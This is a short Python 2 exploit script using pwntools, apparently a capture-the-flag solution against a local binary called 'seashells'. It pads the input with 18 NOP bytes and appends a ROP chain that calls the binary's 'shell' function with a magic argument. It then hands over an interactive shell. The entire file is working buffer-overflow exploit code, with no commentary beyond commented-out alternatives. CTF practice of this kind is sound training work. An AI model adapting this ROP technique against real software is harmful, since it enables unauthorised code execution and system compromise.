#!/usr/bin/env python2

from pwn import *

context(arch='amd64', os='linux')

def pwn():

    e = ELF("./seashells")

    #ret2winaddr = p64(e.symbols["shell"])
    #ret2winaddr = p64(0x04006e3)

    rop = ROP("./seashells")
    rop.call(e.symbols["shell"], [0xdeadcafebabebeef])
    print(rop.dump())

    #info("%#x target", e.symbols.shell)

    io = process('./seashells')
    print(io.recvuntil("Would you like a shell?"))

    buf = '\x90' * 18
    io.sendline(buf + rop.chain() + "\n")
    io.interactive()


if __name__ == '__main__':
    pwn()
